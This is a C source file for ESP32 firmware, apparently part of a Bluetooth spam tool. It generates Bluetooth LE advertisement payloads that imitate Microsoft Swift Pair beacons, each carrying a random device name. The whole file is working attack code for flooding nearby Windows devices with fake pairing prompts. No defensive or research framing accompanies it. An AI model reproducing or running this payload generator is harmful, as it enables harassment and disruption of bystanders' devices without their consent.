// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


#include "swift_pair_spam.h"
#include "esp_random.h"
#include <string.h>

static char* generateRandomName() {
    static char name[12];
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = (esp_random() % 10) + 1;
    for (int i = 0; i < len; ++i) {
        name[i] = charset[esp_random() % 52];
    }
    name[len] = '\0';
    return name;
}

int generate_swift_pair_payload(uint8_t *buffer, size_t max_len) {
    if (!buffer) return 0;

    char *name = generateRandomName();
    uint8_t name_len = strlen(name);
    // Check limits: 7 fixed bytes + name_len
    if (7 + name_len > max_len) name_len = max_len - 7;
    
    uint8_t i = 0;
    buffer[i++] = 6 + name_len; // Length
    buffer[i++] = 0xFF;         // Type: Manufacturer Specific
    buffer[i++] = 0x06;         // Microsoft ID LSB
    buffer[i++] = 0x00;         // Microsoft ID MSB
    buffer[i++] = 0x03;         // Beacon Code
    buffer[i++] = 0x00;
    buffer[i++] = 0x80;
    memcpy(&buffer[i], name, name_len);
    return i + name_len;
}
